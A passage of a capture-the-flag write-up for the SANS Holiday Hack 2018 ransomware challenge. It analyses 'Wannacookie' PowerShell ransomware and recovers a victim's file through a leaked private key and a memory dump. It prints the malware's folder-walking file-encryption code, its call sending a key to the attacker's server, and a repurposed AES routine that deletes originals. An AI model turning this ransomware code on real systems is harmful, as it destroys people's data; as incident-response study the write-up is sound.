Awesome, knowing that all we need to do is try and find the `$Hex_key` variable in memory to decrypt the file! Right?

Well... not necessarily. Let's keep digging into the code to find out why this isn't true.

The following line after this is the most interesting for us.

```powershell
$Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
```

Upon looking into this line, we see that the `$Pub_key_encrypted_Key` variable is set to the output of the `Pub_Key_Enc` function. 

The `Pub_Key_Enc` function takes in two variables, the `$Byte_key` and the `$pub_key` - which are the public key downloaded previously from the server, and the randomly generated byte key that's used to generate the SHA1 has we seen before.

Looking into the `Pub_Key_Enc` function, we can see that this function encrypt the `$Byte_key` using the server's public key, and returns the encrypted key in hexadecimal format.

```powershell
function Pub_Key_Enc($key_bytes, [byte[]]$pub_bytes){
     $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
     $cert.Import($pub_bytes)
     $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true)
     return $(B2H $encKey)
}
```

After the key is encrypted, the malware generates a `$cookie_id`, sends the public encrypted key to the server, generates the current `$date_time` and then creates an array of files that end with `.elfdb` called `$future_cookies`.

These files are then encrypted with the byte key using the `enc_dec` function.

```powershell
    $cookie_id = (send_key $Pub_key_encrypted_Key)
    $date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n")
    [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
    enc_dec $Byte_key $future_cookies $true
```

Now once that's done, the following two lines after are where things get a little bit more interesting.

```powershell
    Clear-variable -Name "Hex_key"
    Clear-variable -Name "Byte_key"
```

We can that the [Clear-Variable](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/clear-variable?view=powershell-6) command is used to unset the `Hex_key` and `Byte_key` which initially means that these variables are cleared from memory as well!

Darn, there goes our key from memory! So... what can we do to find our key?

Well luckily for us, the `$Pub_key_encrypted_Key` wasn't cleared from memory and it contains the byte key! Unfortunately for us, it's encrypted with the public key, so we will need the respective private key to decrypt this string.

Okay, so let's think here for a moment. How can we get the private key? It's impossible right?

Well... maybe not this time! Remember how the server responds to DNS TXT queries that contain hex? We got our public key using that method. So what's the chances that there's a server misconfiguration that will allow us to pull the private key via the same method?

Well, there's only one way to find out!

Looking back into the public key download function we see that the data is being converted from base64. 

```powershell
$pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
```

I highly doubt that the private key is set as such, so let's add the following line into our code, below the public key to attempt and download the private key.

**NOTE**: That `7365727665722e6b6579` is just `server.key` in hex.

```powershell
$priv_key = $(get_over_dns("7365727665722e6b6579"))
```

Once we have that in our code, let's go ahead and save it. Then let's set a breakpoint on line `196` by selecting the line and pressing `F9`. Afterwards we can press `F5` to begin the execution of the malware.

<p align="center"><a href="/images/hh18-104.png"><img src="/images/hh18-104.png"></a></p>

The malware should have pulled our private key for us. We can now output that to a file of our choosing from the debug console by using `Out-File` on the `$priv_key` variable.

```powershell
Hit Line breakpoint on 'C:\Users\User\Desktop\Wannacookie\source-non-min.ps1:196'
[DBG]: PS C:\Users\User\Desktop\Wannacookie>> $priv_key | Out-File server.key

[DBG]: PS C:\Users\User\Desktop\Wannacookie>> ls


    Directory: C:\Users\User\Desktop\Wannacookie


Mode                LastWriteTime         Length Name                                                                                                                    
----                -------------         ------ ----                                                                                                                    
d-----       12/27/2018   5:40 PM                forensic_artifacts                                                                                                      
-a----       12/17/2018   9:46 AM         113540 CHOCOLATE_CHIP_COOKIE_RECIPE.docm                                                                                       
-a----       12/28/2018   2:18 PM            938 dropper.ps1                                                                                                             
-a----       12/27/2018  10:28 AM             38 kill.ps1                                                                                                                
-a----       12/28/2018   2:32 PM           7514 server.crt                                                                                                              
-a----       12/28/2018   3:53 PM           3470 server.key                                                                                                              
-a----       12/28/2018   3:50 PM          21196 source-non-min.ps1                                                                                                      
-a----       12/27/2018   3:51 PM        1715754 source.min.

PS C:\Users\User\Desktop\Wannacookie> cat .\server.key
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----
```

And there we have it! We got the private key!

Awesome, so all that's left for us to do is to figure out the structure of the `$Pub_key_encrypted_Key` variable so we can pull that from memory.

Go ahead and set another breakpoint on line `199` by selecting the line and pressing `F9`. Once set, press `F5` to continue execution until the next breakpoint.

<p align="center"><a href="/images/hh18-105.png"><img src="/images/hh18-105.png"></a></p>

From there can go head and print out the `$Pub_key_encrypted_Key` to see it's structure, and also  get the length of the key since we will need these for the next step.

```powershell
Hit Line breakpoint on 'C:\Users\User\Desktop\Wannacookie\source-non-min.ps1:199'
[DBG]: PS C:\Users\User\Desktop\Wannacookie>> $Pub_key_encrypted_Key
657d08736ed47ee0e816efe365bb1d6d72f13c50832722b483c85e83073afe792a6772505f2dfc2d9cfda3fecef53492692344f2591f040e3fa71846cc5d414d11f5898fa5f26865e48cbc2e59a25c0d5ac5cd43b94d8b361945c6ea87dc14e6698b3711b7577d3a9f69020debd9cc380c713b2d82de50e5dafbf6a4b2d15df09b5049d93a351e87598a35b42956df86c77f1755037a2f2f62cef976190b42e4ddeb00023643224a6dfd8ccbde1509d3eabdf4a18e1548a5a3151094ca8fb752a1865057f8157c77738844f20552c7f925048f72c0dc51735d0a1af11bc211dcf147b6545e8893316e92b28e6e154e04a0dcfd6565b0d196c8658c857c7c539d

[DBG]: PS C:\Users\User\Desktop\Wannacookie>> $Pub_key_encrypted_Key.Length
512
```
Okay, now let's navigate back to our forensics folder and start up [power_dump](https://github.com/chrisjd20/power_dump).

```console
PS C:\Users\User\Desktop\Wannacookie\forensic_artifacts> python.exe .\power_dump\power_dump.py
==============================
 |  __ \
 | |__) |____      _____ _ __
 |  ___/ _ \ \ /\ / / _ \ '__|
 | |  | (_) \ V  V /  __/ |
 |_|   \___/ \_/\_/ \___|_|
 __                       __
 \ \         (   )       / /
  \ \_    (   ) (      _/ /
   \__\    ) _   )    /__/
      \\    ( \_     //
       `\ _(_\ \)__ /'
         (____\___))
  _____  _    _ __  __ _____
 |  __ \| |  | |  \/  |  __ \
 | |  | | |  | | \  / | |__) |
 | |  | | |  | | |\/| |  ___/
 | |__| | |__| | |  | | |
 |_____/ \____/|_|  |_|_|
Dumps PowerShell From Memory
==============================
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit


: 1
```

Once loaded, select option `1` to load a memory dump file. And then use the `ld` command to load the file.

```console
============ Load Dump Menu ================
COMMAND |     ARGUMENT       | Explanation
========|====================|==============
ld      | /path/to/file.name | load mem dump
ls      | ../directory/path  | list files
B       |                    | back to menu
============= Loaded File: =================

============================================
: ls

============= Listing of ./ =================
Dir  - power_dump
File - alabaster_passwords.elfdb.wannacookie 16420
File - powershell.exe_181109_104716.dmp 427762187
Enter to Continue...

============ Load Dump Menu ================
COMMAND |     ARGUMENT       | Explanation
========|====================|==============
ld      | /path/to/file.name | load mem dump
ls      | ../directory/path  | list files
B       |                    | back to menu
============= Loaded File: =================

============================================
: ld powershell.exe_181109_104716.dmp

============ Load Dump Menu ================
COMMAND |     ARGUMENT       | Explanation
========|====================|==============
ld      | /path/to/file.name | load mem dump
ls      | ../directory/path  | list files
B       |                    | back to menu
============= Loaded File: =================
powershell.exe_181109_104716.dmp 427762187
============================================
: b
```

Once the file is loaded, press `b` to go back and then select option `2` to process the dump.

```console
============ Main Menu ================
Memory Dump: powershell.exe_181109_104716.dmp
Loaded     : True
Processed  : False



1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 2
[i] Please wait, processing memory dump...
[+] Found 65 script blocks!
[+] Found some Powershell variable names to work with...
[+] Found 10947 possible variables stored in memory
Would you like to save this processed data for quick processing later "Y"es or "N"o?
: Y

Successfully Processed Memory Dump!

Press Enter to Continue...
```

Once the dump is processed successful, press `Enter` to return to the main screen and then select option `4` so we can start searching the memory dump for our encrypted key.

```console
============ Main Menu ================
Memory Dump: powershell.exe_181109_104716.dmp
Loaded     : True
Processed  : True
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 4

[i] 10947 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
:
```

Alright, now that the memory dump is loaded we can go ahead and start searching for our encrypted key.

We know that the encrypted key is in hexadecimal and that it's 512 bytes in length. We will utilize the `matches` regex of power dump to search for just hex, and then tell it to look for any matching hex key that is 512 bytes long.

```console
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: matches "^[a-fA-F0-9]+$"

================ Filters ================
1| MATCHES  bool(re.search(r"^[a-fA-F0-9]+$",variable_values))

[i] 196 powershell Variable Values found!


============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: len == 512

================ Filters ================
1| MATCHES  bool(re.search(r"^[a-fA-F0-9]+$",variable_values))
2| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
```

Nice! So we found 1 variable in the dump. Let's print it and also dump it so we have it saved in a file for future reference.

```console
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
Variable Values #1 above ^
Type any key to go back and just Enter to Continue...

================ Filters ================
1| MATCHES  bool(re.search(r"^[a-fA-F0-9]+$",variable_values))
2| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: dump
[+] saved variables to powershell_var_script_dump/variable_values.txt

================ Filters ================
1| MATCHES  bool(re.search(r"^[a-fA-F0-9]+$",variable_values))
2| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
```

Okay, so we have the encrypted key, and our private key. All that's left to do is decrypt the the public key encrypted string to get our hex key for file decryption!

I decided to use Python for this step since it was way easier to implement the decryption process, then it was using powershell.

Also note, that we implemented the [PKCS#1 OAEP](https://pycryptodome.readthedocs.io/en/latest/src/cipher/oaep.html) asymmetric cipher as it allowed us to use public/private key encryption and decryption.

I'm not really going to detail the code for decryption as it's pretty much self-explanatory.

The following code for the decryption process can be seen below:

```python
Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.PublicKey import RSA
>>> from Crypto.Cipher import PKCS1_OAEP
>>> import binascii
>>> private_key = open("server.key", "rb").read()
>>> rsa_key = RSA.importKey(private_key)
>>> enc_key = "3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971"
>>> raw_enc_key = enc_key.decode('hex')
>>> cipher = PKCS1_OAEP.new(rsa_key)
>>> decrypted = cipher.decrypt(raw_enc_key)
>>> print binascii.hexlify(decrypted)
fbcfc121915d99cc20a3d3d5d84f8308
```

Once the public encrypted key is decrypted using the private key, we see our hex key of `fbcfc121915d99cc20a3d3d5d84f8308`.

Now that we have the key, we need to re-purpose the malware code to decrypt our `.elfdb` file.

This process is pretty simple really. To know what we need to reimplement, let's just look back at the malware's decryption process.

```powershell
            } elseif ($received -eq 'GET /decrypt') {
                $akey = $Req.QueryString.Item("key")
                if ($Key_Hash -eq $(Sha1 $akey)) {
                    $akey = $(H2B $akey)
                    [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
                    enc_dec $akey $allcookies $false
                    $html = "Files have been decrypted!"
                    $close = $true
```

Since we already have the `$akey` variable (which is our decrypted hex key), and we don't need to compare hashes against the `$Key_Hash` variable, then all we really need are the last three (3) lines of the code up until the `$html` variable.

```powershell
$akey = $(H2B $akey)
[array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
enc_dec $akey $allcookies $false
```

Simply this code takes our hex key, generates an array called `$allcookies` that contains any file in the `userprofile` path that ends with `.wannacookie` and then passes those files, with the hex key into the `end_dec` function for decryption.

So all we need to do, is hardcode our key, add these three lines for decryption to the end, and copy paste a few of the necessary functions used by the other functions to decrypt our file.

The following re-purposed code is seen below:

```powershell
$functions = {
    function Enc_Dec-File($key, $File, $enc_it) {
        [byte[]]$key = $key
        $Suffix = "`.wannacookie"
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
        [System.Int32]$KeySize = $key.Length*8
        $AESP = New-Object 'System.Security.Cryptography.AesManaged'
        $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AESP.BlockSize = 128
        $AESP.KeySize = $KeySize
        $AESP.Key = $key
        $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open)
        if ($enc_it) {$DestFile = $File + $Suffix} else {$DestFile = ($File -replace $Suffix)}
        $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create)
        if ($enc_it) {
            $AESP.GenerateIV()
            $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4)
            $FileSW.Write($AESP.IV, 0, $AESP.IV.Length)
            $Transform = $AESP.CreateEncryptor()
        } else {
            [Byte[]]$LenIV = New-Object Byte[] 4
            $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileSR.Read($LenIV,  0, 3) | Out-Null
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
            [Byte[]]$IV = New-Object Byte[] $LIV
            $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileSR.Read($IV, 0, $LIV) | Out-Null
            $AESP.IV = $IV
            $Transform = $AESP.CreateDecryptor()
        }
        $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
        [Int]$Count = 0
        [Int]$BlockSzBts = $AESP.BlockSize / 8
        [Byte[]]$Data = New-Object Byte[] $BlockSzBts
        Do
        {
            $Count = $FileSR.Read($Data, 0, $BlockSzBts)
            $CryptoS.Write($Data, 0, $Count)
        }
        While ($Count -gt 0)
        $CryptoS.FlushFinalBlock()
        $CryptoS.Close()
        $FileSR.Close()
        $FileSW.Close()
        Clear-variable -Name "key"
        Remove-Item $File
    }
}

function H2B {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
}

function B2H {
    param($DEC)
    $tmp = ''
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value
        if ($a.length -eq 1){
            $tmp += '0' + $a
        } else {
            $tmp += $a
        }
    }
    return $tmp
}

function enc_dec {
    param($key, $allfiles, $make_cookie )
    $tcount = 12
    for ( $file=0; $file -lt $allfiles.length; $file++  ) {
        while ($true) {
            $running = @(Get-Job | Where-Object { $_.State -eq 'Running' })
            if ($running.Count -le $tcount) {
                Start-Job  -ScriptBlock {
                    param($key, $File, $true_false)
                    try{
                        Enc_Dec-File $key $File $true_false
                    } catch {
                        $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions
                break
            } else {
                Start-Sleep -m 200
                continue
            }
        }
    }
}


$key = "fbcfc121915d99cc20a3d3d5d84f8308"
$akey = $(H2B $key)
[array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
enc_dec $akey $allcookies $false
```

From here, put the encrypted `.elfdb` file on your desktop and execute the decryption script.

```powershell
PS C:\Users\User\Desktop> ls


    Directory: C:\Users\User\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/26/2018   6:14 PM                Tools
d-----       12/28/2018  11:32 PM                Wannacookie
-a----        11/9/2018   7:25 AM          16420 alabaster_passwords.elfdb.wannacookie


PS C:\Users\User\Desktop> .\Wannacookie\decrypt.ps1

Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
--     ----            -------------   -----         -----------     --------             -------
1      Job1            BackgroundJob   Running       True            localhost            ...
3      Job3            BackgroundJob   Running       True            localhost            ...


PS C:\Users\User\Desktop> ls


    Directory: C:\Users\User\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/26/2018   6:14 PM                Tools
d-----       12/28/2018  11:32 PM                Wannacookie
-a----       12/29/2018  11:33 AM          16384 alabaster_passwords.elfdb
```

Awesome! We seem to have been able to decrypt the database file.

To view the file I just went to [SQLite Viewer](http://inloop.github.io/sqlite-viewer/) and uploaded the database.

<p align="center"><a href="/images/hh18-106.png"><img src="/images/hh18-106.png"></a></p>

We see the `vault` key is `ED#ED#EED#EF#G#F#G#ABA#BA#B`. Knowing that, let's navigate to out badge and enter it to complete our final challenge for this objective.

<p align="center"><a href="/images/hh18-107.png"><img src="/images/hh18-107.png"></a></p>

<p align="center"><a href="/images/hh18-108.png"><img src="/images/hh18-108.png"></a></p>

## Objective 10

### Who Is Behind It All?

Upon successfully completing the Ransomware Recovery, we can talk to Alabaster again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-109.png"><img src="/images/hh18-109.png"></a></p>

For this objective, it seems that we need to find out who was the mastermind behind the whole KringleCon plan. 

There also seems to be another door in our way with what seems to be a Piano Lock.

<p align="center"><a href="/images/hh18-111.png"><img src="/images/hh18-111.png"></a></p>

I'm going to assume that the `vault` key that we recovered is our password. But, we also got a hint about the fact that the key of the song should be in `D` and not `E`.

<p align="center"><a href="/images/hh18-110.png"><img src="/images/hh18-110.png"></a></p>

I'm guessing that Alabaster has his musical notes messed up. So let's help him convert them! 

For this challenge I used [Logue Music Services](http://www.logue.net/xp/) to convert our keys from the vault from E to D.

Once done we get the following output.

```
E: E D# E D# E E D# E F# G# F# G# A B A# B A# B <-- Original

D: D C# D C# D D C# D E  F# E  F# G A G# A G# A <-- Converted
```

Now that we have the musical keys converted, let's play them on the piano lock!

<p align="center"><a href="/images/hh18-112.png"><img src="/images/hh18-112.png"></a></p>

And just like that the door opens for us!

Upon walking into the room we see Santa and Hans!

<p align="center"><a href="/images/hh18-113.png"><img src="/images/hh18-113.png"></a></p>

Talking to  Santa we learn the truth!

<p align="center"><a href="/images/hh18-114.png"><img src="/images/hh18-114.png"></a></p>

Knowing that Santa was behind all of this, we can enter our badge and enter `Santa` to complete the final objective!

<p align="center"><a href="/images/hh18-115.png"><img src="/images/hh18-115.png"></a></p>

<p align="center"><a href="/images/hh18-116.png"><img src="/images/hh18-116.png"></a></p>

## Conclusion

As always, SANS has done an amazing job for this year’s Holiday Hack! 

Really looking forward to next years challenge and really hoping for a much more "topic" focused holiday hack!

Cheers everyone, thanks for reading!
